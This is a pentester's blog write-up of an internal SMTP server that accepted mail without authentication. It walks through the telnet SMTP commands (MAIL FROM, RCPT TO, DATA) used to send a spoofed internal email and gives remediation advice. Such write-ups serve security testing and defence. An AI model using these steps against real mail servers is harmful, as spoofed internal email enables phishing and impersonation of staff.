---
title: "Spoofing Any Internal Email"
date: 2025-06-19 
categories: [Network Penetration testing]
tags: [Network Pentest]
---
## [Whoami](https://hesham2611.github.io/hesham.github.io/about/)

#### Description: 
Anonymous login vulnerability occurs when a system or service allows users to authenticate without valid credentials. This often happens in misconfigured FTP servers, SMB shares, and email servers, enabling unauthorized users to access sensitive files, directories, or system information. Attackers can exploit this vulnerability too.
•	Gain unauthorized access to files and directories.
•	Enumerate users and system configurations.
•	Upload malicious files or exfiltrate data.


#### Impact:
In this scenario, i discovered an SMTP service that did not require authentication, allowing them to spoof emails within the internal network.

#### Recommendation
•	Disable Anonymous Authentication:
    o	Ensure authentication is required for all services.
    o	Restrict anonymous access on SMTP.
•	Implement Strong Authentication:
    o	Use strong, unique passwords for all accounts.
    o	Enforce multi-factor authentication (MFA) where possible.



#### Pre Exploitation
During my enumeration process using Nmap and other tools, I discovered that port 25 was open. However, no service version was identified. I decided to connect to it using Telnet or Netcat, and that’s when I encountered a surprising result!

#### Dealing with SMTP

Let's walk through the steps of how to interact with an SMTP server using Telnet.

1) **Initiate Telnet Connection:**<br>
To start, connect to the SMTP server using the following command:<br>
`telnet <SMTP_SERVER> 25`

2) **Server Response:**<br>
The SMTP server responds with a greeting message:<br>
`220 <SMTP_SERVER> Service ready.`

3) **MAIL FROM Command:**<br>
The client specifies the sender's email address using the MAIL FROM command:<br>
`MAIL FROM:<sender_email>`<br>
The server responds with:<br>
`250 OK`<br>

4) **RCPT TO Command:**<br>
The client specifies the recipient's email address using the RCPT TO command:<br>
`RCPT TO:<recipient_email>`<br>
The server responds with:<br>
`250 OK`

5) **DATA Command:**<br>
The client issues the DATA command to start the email content:<br>
`DATA`<br>
The server responds with:<br>
`354 Enter mail body, End mail with a '.' in column 1 on a line by itself.`

6) **Email Content:**<br>
The client types the email's subject and body. In this case, the subject is "POC" and the body is:<br>
`Subject: POC`<br>
and press enter to new line then write the body of the message. In this case, the subject is  <br>
`this is a POC from the SMTP Server`

7) **End of Data:**<br>
The client ends the email body by entering a period (.) on a new line:<br>
`.`

8) **QUIT Command:**<br>
`QUIT`



#### POC 
1) Let’s connect to the SMTP service and try to send an email 

![Alt text](/assets/images/Network1.png)

2) Let’s see if the email was sent.
![Alt text](/assets/images/Network2.png)





**As we can see, the email was sent, and we were able to spoof internal emails.**